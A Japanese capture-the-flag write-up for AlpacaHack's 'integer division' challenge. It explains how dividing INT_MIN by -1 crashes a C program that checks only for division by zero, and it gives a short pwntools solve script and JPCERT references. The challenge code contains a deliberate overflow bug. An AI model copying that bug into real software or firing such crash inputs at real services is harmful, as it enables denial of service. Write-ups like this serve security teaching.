# ■ integer division
[integer division - AlpacaHack](https://alpacahack.com/daily/challenges/integer-division)

## 1. Writeup

`chal.c`:
```c:chal.c
 1 // gcc -o chal chal.c
 2 #include <stdio.h>
 3
 4 int main(void) {
 5     int x, y;
 6     printf("x> ");
 7     fflush(stdout);
 8     scanf("%d", &x);
 9     printf("y> ");
10     fflush(stdout);
11     scanf("%d", &y);
12
13     if (y == 0) {
14         puts("Division by zero is prohibited.");
15     }
16     else {
17         int result = x / y;
18         printf("result: %d\n", result);
19     }
20
21     return 0;
22 }
```

`server.py`:
```python:server.py
1 import subprocess
2
3 completed_process = subprocess.run(["./chal"])
4 if completed_process.returncode != 0:
5     print("[server.py] Unbelievable! FLAG: Alpaca{REDACTED}")
6 else:
7     print("[server.py] This is an expected behavior.")
```

- `chal.c:13`: ゼロ除算の例外処理はされているが, ゼロ除算以外の例外処理はされていない.
- `server.py:4`: プロセスが異常終了するとフラグを出力する.

これらを踏まえると, ゼロ除算以外の例外を発生させれば良い.

> 被除数が符号付き整数型の最小値(負の数)に等しく除数が−1に等しい場合、2の補数による符号付き整数型の除算時にオーバーフローが発生する可能性がある。

つまり, オーバーフローを発生させれば良い. int型の最小値( `-2147483648`, `-0x80000000` )を `-1` で除算することでオーバーフローを発生させられる.

`solve.py`:
```python:solve.py
 1 from pwn import *
 2
 3 context(os='linux', arch='amd64')
 4
 5 HOST = "localhost"
 6 PORT = 1337
 7
 8 io = remote(HOST, PORT)
 9
10 def exploit():
11         io.sendlineafter(b"x>", str(-0x80000000).encode())
12         io.sendlineafter(b"y>", b"-1")
13         io.interactive()
14
15 if __name__ == "__main__":
16         exploit()
```

実行結果例:
```bash
$ python ./solve.py
[server.py] Unbelievable! FLAG: Alpaca{REDACTED}
```

---

ref(s):
- [INT33-C. 除算および剰余演算がゼロ除算エラーを引き起こさないことを保証する](https://www.jpcert.or.jp/m/sc-rules/c-int33-c.html)
- [INT32-C. 符号付き整数演算がオーバーフローを引き起こさないことを保証する](https://www.jpcert.or.jp/m/sc-rules/c-int32-c.html)